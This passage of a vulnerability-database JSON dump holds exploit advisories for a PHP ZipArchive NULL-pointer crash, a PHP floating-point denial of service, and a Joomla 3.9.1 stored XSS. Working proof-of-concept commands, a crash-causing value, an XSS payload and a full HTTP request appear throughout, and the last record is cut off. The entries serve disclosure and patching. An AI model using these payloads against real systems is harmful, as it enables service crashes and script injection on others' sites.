            "sourceData": "[ PHP 5.3.3/5.2.14 ZipArchive::getArchiveComment NULL Pointer Deference ]\r\n\r\nAuthor: Maksymilian Arciemowicz\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\nDate:\r\n- Dis.: 14.09.2010\r\n- Pub.: 05.11.2010\r\n\r\nCVE: CVE-2010-3709\r\nCWE: CWE-476\r\nStatus: Fixed in CVS\r\n\r\nAffected Software:\r\n- PHP 5.3.3\r\n- PHP 5.2.14\r\n\r\nOriginal URL:\r\nhttp://securityreason.com/achievement_securityalert/90\r\n\r\n\r\n--- 0.Description ---\r\nZipArchive enables you to transparently read or write ZIP compressed\r\narchives and the files inside them.\r\n\r\nZipArchive::getArchiveComment \u00e2\u20ac\u201d Returns the Zip archive comment\r\n\r\nstring ZipArchive::getArchiveComment ( void )\r\n\r\n\r\n--- 1. PHP 5.3.3/5.2.14 ZipArchive::getArchiveComment (CWE-476) ---\r\nAs we can see in\r\n\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/php_zip.c?re\r\nvision=303622&view=markup\r\n\r\n---\r\n1945 static ZIPARCHIVE_METHOD(getArchiveComment)\r\n1946 {\r\n1947 struct zip *intern;\r\n1948 zval *this = getThis();\r\n1949 long flags = 0;\r\n1950 const char * comment;\r\n1951 int comment_len = 0;\r\n1952\r\n1953 if (!this) {\r\n1954 RETURN_FALSE;\r\n1955 }\r\n1956\r\n1957 ZIP_FROM_OBJECT(intern, this);\r\n1958\r\n1959 if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"|l\", &flags) ==\r\nFAILURE) {\r\n1960 return;\r\n1961 }\r\n1962\r\n1963 comment = zip_get_archive_comment(intern, &comment_len, (int)flags);\r\n<==== RETURN NULL AND -1\r\n1964 RETURN_STRINGL((char *)comment, (long)comment_len, 1); <===== NULL\r\nPOINTER DEFERENCE HERE\r\n1965 }\r\n---\r\n\r\nthis method return string from zip_get_archive_comment() function. Now we\r\nneed see this function,\r\n\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/lib/zip_get_\r\narchive_comment.c?revision=284361&view=markup\r\n\r\n---\r\n40 ZIP_EXTERN(const char *)\r\n41 zip_get_archive_comment(struct zip *za, int *lenp, int flags)\r\n42 {\r\n43 if ((flags & ZIP_FL_UNCHANGED)\r\n44 || (za->ch_comment_len == -1)) {\r\n45 if (za->cdir) {\r\n46 if (lenp != NULL)\r\n47 *lenp = za->cdir->comment_len;\r\n48 return za->cdir->comment;\r\n49 }\r\n50 else {\r\n51 if (lenp != NULL)\r\n52 *lenp = -1; <===================== -1\r\n53 return NULL; <==================== NULL\r\n54 }\r\n55 }\r\n56\r\n57 if (lenp != NULL)\r\n58 *lenp = za->ch_comment_len;\r\n59 return za->ch_comment;\r\n60 }\r\n---\r\n\r\n\r\nline 52 and 53 should return NULL pointer and (int)-1. In result\r\nRETURN_STRINGL() will be executed with:\r\n\r\nRETURN_STRINGL(NULL, -1, 1);\r\n\r\nand crash in memcpy(3).\r\n\r\n\r\n--- 2. PoC ---\r\n\r\ncx@cx64:/www$ touch empty.zip\r\ncx@cx64:/www$ php -r '$zip= new\r\nZipArchive;$zip->open(\"./empty.zip\");$zip->getArchiveComment();'\r\nSegmentation fault\r\n\r\nDebug:\r\ncx@cx64:/www$ gdb -q php\r\nReading symbols from /usr/bin/php...(no debugging symbols found)...done.\r\n(gdb) r -r '$zip= new\r\nZipArchive;$zip->open(\"./empty.zip\");$zip->getArchiveComment();'\r\nStarting program: /usr/bin/php -r '$zip= new\r\nZipArchive;$zip->open(\"./empty.zip\");$zip->getArchiveComment();'\r\n[Thread debugging using libthread_db enabled]\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00007ffff530edbb in memcpy () from /lib/libc.so.6\r\n(gdb) bt\r\n#0 0x00007ffff530edbb in memcpy () from /lib/libc.so.6\r\n#1 0x0000000000679fa8 in _estrndup ()\r\n#2 0x00000000006371e5 in ?? ()\r\n#3 0x00000000006e793a in ?? ()\r\n#4 0x00000000006bec20 in execute ()\r\n#5 0x000000000068b44a in zend_eval_stringl ()\r\n#6 0x000000000068b5c9 in zend_eval_stringl_ex ()\r\n#7 0x000000000072743e in ?? ()\r\n#8 0x00007ffff52a6c4d in __libc_start_main () from /lib/libc.so.6\r\n#9 0x000000000042c6a9 in _start ()\r\n(gdb) x/i $rip\r\n=> 0x7ffff530edbb <memcpy+347>: rep movsq %ds:(%rsi),%es:(%rdi)\r\n(gdb) x/x $rsi\r\n0x0: Cannot access memory at address 0x0\r\n(gdb) x/x $rbp\r\n0xffffffff: Cannot access memory at address 0xffffffff\r\n\r\n\r\n--- 3. Fix ---\r\nFix:\r\nReplace\r\n1963 comment = zip_get_archive_comment(intern, &comment_len, (int)flags);\r\n1964 RETURN_STRINGL((char *)comment, (long)comment_len, 1);\r\n\r\nto\r\n\r\n1963 comment = zip_get_archive_comment(intern, &comment_len, (int)flags);\r\n1964 if(comment==NULL) RETURN_FALSE;\r\n1965 RETURN_STRINGL((char *)comment, (long)comment_len, 1);\r\n\r\nPHP 5.3:\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/php_zip.c?vi\r\new=log\r\n\r\nPHP 5.2:\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_2/ext/zip/php_zip.c?vi\r\new=log\r\n\r\nMDVSA-2010:218\r\n\r\n\r\n--- 4. Greets ---\r\nSpecial thanks for Pierre Joye\r\n\r\nsp3x, Infospec, Adam Zabrocki 'pi3'\r\n\r\n\r\n--- 5. Contact ---\r\nAuthor: SecurityReason.com [ Maksymilian Arciemowicz ]\r\n\r\nEmail:\r\n- cxib {a\\./t] securityreason [d=t} com\r\n\r\nGPG:\r\n- http://securityreason.com/key/Arciemowicz.Maksymilian.gpg\r\n\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:15431"
        }
    ],
    "CVE-2010-4645": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.2 'zend_strtod()' Function Floating-Point Value Denial of Service Vulnerability. CVE-2010-4645 . Dos exploit for php platform",
            "modified": "2011-01-03T00:00:00",
            "published": "2011-01-03T00:00:00",
            "id": "EDB-ID:35164",
            "href": "https://www.exploit-db.com/exploits/35164/",
            "type": "exploitdb",
            "title": "PHP <= 5.3.2 - 'zend_strtod' Function Floating-Point Value Denial of Service Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/45668/info\r\n\r\nPHP is prone to a remote denial-of-service vulnerability.\r\n\r\nSuccessful attacks will cause applications written in PHP to hang, creating a denial-of-service condition.\r\n\r\nPHP 5.3.3 is vulnerable; other versions may also be affected. \r\n\r\n<?php $d = 2.2250738585072011e-308; ?>",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35164"
        }
    ],
    "CVE-2019-6263": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category web applications",
            "modified": "2019-01-20T00:00:00",
            "published": "2019-01-20T00:00:00",
            "id": "1337DAY-ID-32007",
            "href": "https://0day.today/exploit/description/32007",
            "title": "Joomla Core 3.9.1 - Persistent Cross-Site Scripting in Global Configuration Textfilter Settings",
            "type": "zdt",
            "sourceData": "# Exploit Title: [Joomla Global Configuration Text Filter settings Stored XSS Vulnerability]\r\n# Exploit Author: [Praveen Sutar] , Twitter: @praveensutar123\r\n# Vendor Homepage: [https://www.joomla.org/]\r\n# Affected Versions: [Joomla versions 2.5.0 through 3.9.1]\r\n# Tested on: [Joomla 3.9.1]\r\n# CVE : [CVE-2019-6263]\r\n# Vendor Advisory: [https://developer.joomla.org/security-centre/762-20190103-core-stored-xss-issue-in-the-global-configuration-textfilter-settings]\r\n# Author Blog: [http://awesomehackers.org/2019/01/18/cve-2019-6263-joomla-exploit-poc/]\r\n\r\n==================\r\n#Product:-\r\n==================\r\nThe Flexible Platform Empowering Website Creators. Joomla! is an award-winning content management system (CMS), which enables you to build web sites and powerful online applications.\r\n\r\n==================\r\n#Vulnerability:-\r\n==================\r\nJoomla Core - Stored XSS issue in the Global Configuration textfilter settings.\r\n\r\n========================\r\n#Vulnerability Details:-\r\n========================\r\n\r\n=====================================================================================================================================================\r\n1. Joomla Core - Stored XSS issue in the Global Configuration textfilter settings (CVE-2019-6263)\r\n=====================================================================================================================================================\r\n\r\nJoomla failes to perform adequate checks at the Global Configuration Text Filter settings which allows a stored XSS.\r\n\r\n#Proof-Of-Concept:\r\n------------------\r\n1. Login to Joomla administrator console\r\n2. Navigate to System -> Global Configuration -> Text Filters\r\n3. Add following payload in Filter Tags2 with No HTML (Filter Type) as Public (Filter Group):\r\n\r\n\tjform[filters][1][filter_tags]=ss\"><img+src=+xx+onerror=alert(7575)><\r\n\r\n\r\n==========\r\nRequest :\r\n==========\r\n\tPOST /administrator/index.php?option=com_config HTTP/1.1\r\n\tHost: <target_ip>\r\n\tUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\tAccept-Language: en-US,en;q=0.5\r\n\tAccept-Encoding: gzip, deflate\r\n\tReferer: http://<target_ip>/administrator/index.php?option=com_config\r\n\tContent-Type: application/x-www-form-urlencoded\r\n\tContent-Length: 4303\r\n\tConnection: close\r\n\tCookie: wp-settings-time-1=1540363679; 05e3b315128406acf7dd996046a180f8=__SITE__; 7bb05cf41807f1d0136fbae285e8a16c=1; 783fff54c324d89891f303b51230c499=vnrnl8bo3u62d25ak8tqbruhs2\r\n\tUpgrade-Insecure-Requests: 1\r\n\r\n\tjform%5Bsitename%5D=testjoomla&jform%5Boffline%5D=0&jform%5Bdisplay_offline_message%5D=1&jform%5Boffline_message%5D=This+site+is+down+for+maintenance.%3Cbr+%2F%3EPlease+check+back+again+soon.&jform%5Boffline_image%5D=&jform%5Bfrontediting%5D=1&jform%5Beditor%5D=tinymce&jform%5Bcaptcha%5D=0&jform%5Baccess%5D=1&jform%5Blist_limit%5D=20&jform%5Bfeed_limit%5D=10&jform%5Bfeed_email%5D=none&jform%5BMetaDesc%5D=adsadsa&jform%5BMetaKeys%5D=&jform%5Brobots%5D=&jform%5BMetaRights%5D=&jform%5BMetaAuthor%5D=1&jform%5BMetaVersion%5D=0&jform%5Bsef%5D=1&jform%5Bsef_rewrite%5D=0&jform%5Bsef_suffix%5D=0&jform%5Bunicodeslugs%5D=0&jform%5Bsitename_pagetitles%5D=0&jform%5Bcookie_domain%5D=&jform%5Bcookie_path%5D=&jform%5Blog_path%5D=%2Fvar%2Fwww%2Fhtml%2Fadministrator%2Flogs&jform%5Bhelpurl%5D=https%3A%2F%2Fhelp.joomla.org%2Fproxy%3Fkeyref%3DHelp%7Bmajor%7D%7Bminor%7D%3A%7Bkeyref%7D%26lang%3D%7Blangcode%7D&jform%5Bdebug%5D=0&jform%5Bdebug_lang%5D=0&jform%5Bdebug_lang_const%5D=1&jform%5Bcache_handler%5D=file&jform%5Bcache_path%5D=&jform%5Bmemcache_persist%5D=1&jform%5Bmemcache_compress%5D=0&jform%5Bmemcache_server_host%5D=localhost&jform%5Bmemcache_server_port%5D=11211&jform%5Bmemcached_persist%5D=1&jform%5Bmemcached_compress%5D=0&jform%5Bmemcached_server_host%5D=localhost&jform%5Bmemcached_server_port%5D=11211&jform%5Bredis_persist%5D=1&jform%5Bredis_server_host%5D=localhost&jform%5Bredis_server_port%5D=6379&jform%5Bredis_server_auth%5D=&jform%5Bredis_server_db%5D=0&jform%5Bcachetime%5D=15&jform%5Bcache_platformprefix%5D=0&jform%5Bcaching%5D=0&jform%5Bsession_handler%5D=database&jform%5Bsession_memcache_server_host%5D=localhost&jform%5Bsession_memcache_server_port%5D=11211&jform%5Bsession_memcached_server_host%5D=localhost&jform%5Bsession_memcached_server_port%5D=11211&jform%5Bsession_redis_persist%5D=1&jform%5Bsession_redis_server_host%5D=localhost&jform%5Bsession_redis_server_port%5D=6379&jform%5Bsession_redis_server_auth%5D=&jform%5Bsession_redis_server_db%5D=0&jform%5Blifetime%5D=15&jform%5Bshared_session%5D=0&jform%5Btmp_path%5D=%2Fvar%2Fwww%2Fhtml%2Ftmp&jform%5Bgzip%5D=0&jform%5Berror_reporting%5D=default&jform%5Bforce_ssl%5D=0&jform%5Boffset%5D=UTC&jform%5Bftp_enable%5D=0&jform%5Bftp_host%5D=&jform%5Bftp_port%5D=&jform%5Bftp_user%5D=&jform%5Bftp_pass%5D=&jform%5Bftp_root%5D=&jform%5Bproxy_enable%5D=0&jform%5Bproxy_host%5D=&jform%5Bproxy_port%5D=&jform%5Bproxy_user%5D=&jform%5Bproxy_pass%5D=&jform%5Bdbtype%5D=mysqli&jform%5Bhost%5D=localhost&jform%5Buser%5D=root&jform%5Bdb%5D=joomla&jform%5Bdbprefix%5D=isadh_&jform%5Bmailonline%5D=1&jform%5Bmassmailoff%5D=0&jform%5Bmailfrom%5D=test%40example.com&jform%5Bfromname%5D=testjoomla&jform%5Breplyto%5D=&jform%5Breplytoname%5D=&jform%5Bmailer%5D=mail&jform%5Bsendmail%5D=%2Fusr%2Fsbin%2Fsendmail&jform%5Bsmtphost%5D=localhost&jform%5Bsmtpport%5D=25&jform%5Bsmtpsecure%5D=none&jform%5Bsmtpauth%5D=0&jform%5Bsmtpuser%5D=&jform%5Bsmtppass%5D=&jform%5Bfilters%5D%5B1%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B1%5D%5Bfilter_tags%5D=ss%22%3E%3Cimg+src%3D+xx+onerror%3Dalert%287575%29%3E%3C&jform%5Bfilters%5D%5B1%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B9%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B6%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B7%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_type%5D=NH&jform%5Bfilters%5D%5B2%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B3%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B4%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B5%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B8%5D%5Bfilter_type%5D=NONE&jform%5Bfilters%5D%5B8%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B8%5D%5Bfilter_attributes%5D=&task=config.save.application.apply&fc4982bad4604f5ea5d8adc003a6034c=1\r\n\r\n\r\n\r\n4. Save the Changes.\r\n5. Navigate to Global Configuration page and an alert box will pop up. Here's the response body:\r\n\r\n==========\r\nResponse:\r\n==========\r\n\tHTTP/1.1 303 See other\r\n\tDate: Fri, 18 Jan 2019 07:30:48 GMT\r\n\tServer: Apache/2.4.7 (Ubuntu)\r\n\tX-Powered-By: PHP/5.5.9-1ubuntu4.26\r\n\tLocation: /administrator/index.php?option=com_config\r\n\tExpires: Wed, 17 Aug 2005 00:00:00 GMT\r\n\tLast-Modified: Fri, 18 Jan 2019 07:30:48 GMT\r\n\tCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\n\tPragma: no-cache\r\n\tContent-Length: 0\r\n\tConnection: close\r\n\tContent-Type: text/html; charset=utf-8\r\n\r\n\r\n===================================\r\n#Vulnerability Disclosure Timeline:\r\n===================================\r\n\r\n11/2018: First email to disclose the vulnerability to Joomla.\r\n12/2018: Vendor confirmed vulnerability.\r\n01/2019: Vendor published advisory and released a fix.\n\n#  0day.today [2019-02-25]  #",
            "cvss": {
                "score": 3.5,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:SINGLE_INSTANCE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-32007"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-01-18T00:00:00",
            "published": "2019-01-18T00:00:00",
            "id": "EDB-ID:46200",
            "href": "https://www.exploit-db.com/exploits/46200",
            "type": "exploitdb",
            "title": "Joomla! Core 3.9.1 - Persistent Cross-Site Scripting in Global Configuration Textfilter Settings",
            "sourceData": "# Exploit Title: [Joomla Global Configuration Text Filter settings Stored XSS Vulnerability]\r\n# Date: [18/01/2019]\r\n# Exploit Author: [Praveen Sutar] , Twitter: @praveensutar123\r\n# Vendor Homepage: [https://www.joomla.org/]\r\n# Affected Versions: [Joomla versions 2.5.0 through 3.9.1]\r\n# Tested on: [Joomla 3.9.1]\r\n# CVE : [CVE-2019-6263]\r\n# Vendor Advisory: [https://developer.joomla.org/security-centre/762-20190103-core-stored-xss-issue-in-the-global-configuration-textfilter-settings]\r\n# Author Blog: [http://awesomehackers.org/2019/01/18/cve-2019-6263-joomla-exploit-poc/]\r\n\r\n==================\r\n#Product:-\r\n==================\r\nThe Flexible Platform Empowering Website Creators. Joomla! is an award-winning content management system (CMS), which enables you to build web sites and powerful online applications.\r\n\r\n==================\r\n#Vulnerability:-\r\n==================\r\nJoomla Core - Stored XSS issue in the Global Configuration textfilter settings.\r\n\r\n========================\r\n#Vulnerability Details:-\r\n========================\r\n\r\n=====================================================================================================================================================\r\n1. Joomla Core - Stored XSS issue in the Global Configuration textfilter settings (CVE-2019-6263)\r\n=====================================================================================================================================================\r\n\r\nJoomla failes to perform adequate checks at the Global Configuration Text Filter settings which allows a stored XSS.\r\n\r\n#Proof-Of-Concept:\r\n------------------\r\n1. Login to Joomla administrator console\r\n2. Navigate to System -> Global Configuration -> Text Filters\r\n3. Add following payload in Filter Tags2 with No HTML (Filter Type) as Public (Filter Group):\r\n\r\n\tjform[filters][1][filter_tags]=ss\"><img+src=+xx+onerror=alert(7575)><\r\n\r\n\r\n==========\r\nRequest :\r\n==========\r\n\tPOST /administrator/index.php?option=com_config HTTP/1.1\r\n\tHost: <target_ip>\r\n\tUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\tAccept-Language: en-US,en;q=0.5\r\n\tAccept-Encoding: gzip, deflate\r\n\tReferer: http://<target_ip>/administrator/index.php?option=com_config\r\n\tContent-Type: application/x-www-form-urlencoded\r\n\tContent-Length: 4303\r\n\tConnection: close\r\n\tCookie: wp-settings-time-1=1540363679; 05e3b315128406acf7dd996046a180f8=__SITE__; 7bb05cf41807f1d0136fbae285e8a16c=1; 783fff54c324d89891f303b51230c499=vnrnl8bo3u62d25ak8tqbruhs2\r\n\tUpgrade-Insecure-Requests: 1\r\n\r\n\tjform%5Bsitename%5D=testjoomla&jform%5Boffline%5D=0&jform%5Bdisplay_offline_message%5D=1&jform%5Boffline_message%5D=This+site+is+down+for+maintenance.%3Cbr+%2F%3EPlease+check+back+again+soon.&jform%5Boffline_image%5D=&jform%5Bfrontediting%5D=1&jform%5Beditor%5D=tinymce&jform%5Bcaptcha%5D=0&jform%5Baccess%5D=1&jform%5Blist_limit%5D=20&jform%5Bfeed_limit%5D=10&jform%5Bfeed_email%5D=none&jform%5BMetaDesc%5D=adsadsa&jform%5BMetaKeys%5D=&jform%5Brobots%5D=&jform%5BMetaRights%5D=&jform%5BMetaAuthor%5D=1&jform%5BMetaVersion%5D=0&jform%5Bsef%5D=1&jform%5Bsef_rewrite%5D=0&jform%5Bsef_suffix%5D=0&jform%5Bunicodeslugs%5D=0&jform%5Bsitename_pagetitles%5D=0&jform%5Bcookie_domain%5D=&jform%5Bcookie_path%5D=&jform%5Blog_path%5D=%2Fvar%2Fwww%2Fhtml%2Fadministrator%2Flogs&jform%5Bhelpurl%5D=https%3A%2F%2Fhelp.joomla.org%2Fproxy%3Fkeyref%3DHelp%7Bmajor%7D%7Bminor%7D%3A%7Bkeyref%7D%26lang%3D%7Blangcode%7D&jform%5Bdebug%5D=0&jform%5Bdebug_lang%5D=0&jform%5Bdebug_lang_const%5D=1&jform%5Bcache_handler%5D=file&jform%5Bcache_path%5D=&jform%5Bmemcache_persist%5D=1&jform%5Bmemcache_compress%5D=0&jform%5Bmemcache_server_host%5D=localhost&jform%5Bmemcache_server_port%5D=11211&jform%5Bmemcached_persist%5D=1&jform%5Bmemcached_compress%5D=0&jform%5Bmemcached_server_host%5D=localhost&jform%5Bmemcached_server_port%5D=11211&jform%5Bredis_persist%5D=1&jform%5Bredis_server_host%5D=localhost&jform%5Bredis_server_port%5D=6379&jform%5Bredis_server_auth%5D=&jform%5Bredis_server_db%5D=0&jform%5Bcachetime%5D=15&jform%5Bcache_platformprefix%5D=0&jform%5Bcaching%5D=0&jform%5Bsession_handler%5D=database&jform%5Bsession_memcache_server_host%5D=localhost&jform%5Bsession_memcache_server_port%5D=11211&jform%5Bsession_memcached_server_host%5D=localhost&jform%5Bsession_memcached_server_port%5D=11211&jform%5Bsession_redis_persist%5D=1&jform%5Bsession_redis_server_host%5D=localhost&jform%5Bsession_redis_server_port%5D=6379&jform%5Bsession_redis_server_auth%5D=&jform%5Bsession_redis_server_db%5D=0&jform%5Blifetime%5D=15&jform%5Bshared_session%5D=0&jform%5Btmp_path%5D=%2Fvar%2Fwww%2Fhtml%2Ftmp&jform%5Bgzip%5D=0&jform%5Berror_reporting%5D=default&jform%5Bforce_ssl%5D=0&jform%5Boffset%5D=UTC&jform%5Bftp_enable%5D=0&jform%5Bftp_host%5D=&jform%5Bftp_port%5D=&jform%5Bftp_user%5D=&jform%5Bftp_pass%5D=&jform%5Bftp_root%5D=&jform%5Bproxy_enable%5D=0&jform%5Bproxy_host%5D=&jform%5Bproxy_port%5D=&jform%5Bproxy_user%5D=&jform%5Bproxy_pass%5D=&jform%5Bdbtype%5D=mysqli&jform%5Bhost%5D=localhost&jform%5Buser%5D=root&jform%5Bdb%5D=joomla&jform%5Bdbprefix%5D=isadh_&jform%5Bmailonline%5D=1&jform%5Bmassmailoff%5D=0&jform%5Bmailfrom%5D=test%40example.com&jform%5Bfromname%5D=testjoomla&jform%5Breplyto%5D=&jform%5Breplytoname%5D=&jform%5Bmailer%5D=mail&jform%5Bsendmail%5D=%2Fusr%2Fsbin%2Fsendmail&jform%5Bsmtphost%5D=localhost&jform%5Bsmtpport%5D=25&jform%5Bsmtpsecure%5D=none&jform%5Bsmtpauth%5D=0&jform%5Bsmtpuser%5D=&jform%5Bsmtppass%5D=&jform%5Bfilters%5D%5B1%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B1%5D%5Bfilter_tags%5D=ss%22%3E%3Cimg+src%3D+xx+onerror%3Dalert%287575%29%3E%3C&jform%5Bfilters%5D%5B1%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B9%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B6%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B7%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_type%5D=NH&jform%5Bfilters%5D%5B2%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B3%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B4%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B5%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B8%5D%5Bfilter_type%5D=NONE&jform%5Bfilters%5D%5B8%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B8%5D%5Bfilter_attributes%5D=&task=config.save.application.apply&fc4982bad4604f5ea5d8adc003a6034c=1\r\n\r\n\r\n\r\n4. Save the Changes.\r\n5. Navigate to Global Configuration page and an alert box will pop up. Here's the response body:\r\n\r\n==========\r\nResponse:\r\n==========\r\n\tHTTP/1.1 303 See other\r\n\tDate: Fri, 18 Jan 2019 07:30:48 GMT\r\n\tServer: Apache/2.4.7 (Ubuntu)\r\n\tX-Powered-By: PHP/5.5.9-1ubuntu4.26\r\n\tLocation: /administrator/index.php?option=com_config\r\n\tExpires: Wed, 17 Aug 2005 00:00:00 GMT\r\n\tLast-Modified: Fri, 18 Jan 2019 07:30:48 GMT\r\n\tCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\n\tPragma: no-cache\r\n\tContent-Length: 0\r\n\tConnection: close\r\n\tContent-Type: text/html; charset=utf-8\r\n\r\n\r\n===================================\r\n#Vulnerability Disclosure Timeline:\r\n===================================\r\n\r\n11/2018: First email to disclose the vulnerability to Joomla.\r\n12/2018: Vendor confirmed vulnerability.\r\n01/2019: Vendor published advisory and released a fix.",
            "cvss": {
                "score": 3.5,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:SINGLE_INSTANCE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:46200"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-01-18T00:00:00",
            "published": "2019-01-18T00:00:00",
            "id": "PACKETSTORM:151234",
            "href": "https://packetstormsecurity.com/files/151234/Joomla-3.9.1-Cross-Site-Scripting.html",
            "title": "Joomla! 3.9.1 Cross Site Scripting",
            "type": "packetstorm",
            "sourceData": "`# Exploit Title: [Joomla Global Configuration Text Filter settings Stored XSS Vulnerability]  \n# Date: [18/01/2019]  \n# Exploit Author: [Praveen Sutar] , Twitter: @praveensutar123  \n# Vendor Homepage: [https://www.joomla.org/]  \n# Affected Versions: [Joomla versions 2.5.0 through 3.9.1]  \n# Tested on: [Joomla 3.9.1]  \n# CVE : [CVE-2019-6263]  \n# Vendor Advisory: [https://developer.joomla.org/security-centre/762-20190103-core-stored-xss-issue-in-the-global-configuration-textfilter-settings]  \n# Author Blog: [http://awesomehackers.org/2019/01/18/cve-2019-6263-joomla-exploit-poc/]  \n  \n==================  \n#Product:-  \n==================  \nThe Flexible Platform Empowering Website Creators. Joomla! is an award-winning content management system (CMS), which enables you to build web sites and powerful online applications.  \n  \n==================  \n#Vulnerability:-  \n==================  \nJoomla Core - Stored XSS issue in the Global Configuration textfilter settings.  \n  \n========================  \n#Vulnerability Details:-  \n========================  \n  \n=====================================================================================================================================================  \n1. Joomla Core - Stored XSS issue in the Global Configuration textfilter settings (CVE-2019-6263)  \n=====================================================================================================================================================  \n  \nJoomla failes to perform adequate checks at the Global Configuration Text Filter settings which allows a stored XSS.  \n  \n#Proof-Of-Concept:  \n------------------  \n1. Login to Joomla administrator console  \n2. Navigate to System -> Global Configuration -> Text Filters  \n3. Add following payload in Filter Tags2 with No HTML (Filter Type) as Public (Filter Group):  \n  \njform[filters][1][filter_tags]=ss\"><img+src=+xx+onerror=alert(7575)><  \n  \n  \n==========  \nRequest :  \n==========  \nPOST /administrator/index.php?option=com_config HTTP/1.1  \nHost: <target_ip>  \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nAccept-Language: en-US,en;q=0.5  \nAccept-Encoding: gzip, deflate  \nReferer: http://<target_ip>/administrator/index.php?option=com_config  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 4303  \nConnection: close  \nCookie: wp-settings-time-1=1540363679; 05e3b315128406acf7dd996046a180f8=__SITE__; 7bb05cf41807f1d0136fbae285e8a16c=1; 783fff54c324d89891f303b51230c499=vnrnl8bo3u62d25ak8tqbruhs2  \nUpgrade-Insecure-Requests: 1  \n  